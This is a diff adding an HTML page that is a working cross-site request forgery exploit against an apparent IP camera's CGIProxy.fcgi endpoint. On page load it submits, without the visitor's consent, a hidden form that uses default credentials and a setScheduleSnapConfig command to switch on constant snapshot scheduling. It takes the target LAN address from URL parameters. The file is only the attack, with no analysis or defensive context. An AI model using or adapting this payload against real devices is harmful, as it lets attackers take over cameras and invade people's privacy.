@@ -1,0 +1,36 @@
+<html>
+<title>
+</title>
+<body>
+
+ <form id="pwnit2" action="willbereplaced/cgi-bin/CGIProxy.fcgi">
+
+ <input type="hidden" name="usr&#61;user&amp;pwd&#61;password&amp;cmd&#61;setScheduleSnapConfig&amp;isEnable&#61;1&amp;snapInterval&#61;2&amp;schedule0&#61;281474976710655&amp;schedule1&#61;281474976710655&amp;schedule2&#61;281474976710655&amp;schedule3&#61;281474976710655&amp;schedule4&#61;281474976710655&amp;schedule5&#61;281474976710655&amp;schedule6&#61;281474976710655&amp;1466017860567" value="" />
+	    <input type="submit" value="Submit request" />
+
+  </form>
+  
+<script>
+function gup( name, url ) {
+  if (!url) url = location.href;
+  name = name.replace(/[\[]/,"\\\[").replace(/[\]]/,"\\\]");
+  var regexS = "[\\?&]"+name+"=([^&#]*)";
+  var regex = new RegExp( regexS );
+  var results = regex.exec( url );
+  return results == null ? null : results[1];
+}
+
+var lastOctet = gup('octet', window.location.href );
+var network = gup('network', window.location.href );
+
+var iform;
+
+iform=document.getElementById("pwnit2");
+
+iform.action = "http://"+network+"."+lastOctet.toString()+":88/cgi-bin/CGIProxy.fcgi";
+
+iform.submit();
+</script>
+
+</body>
+</html>
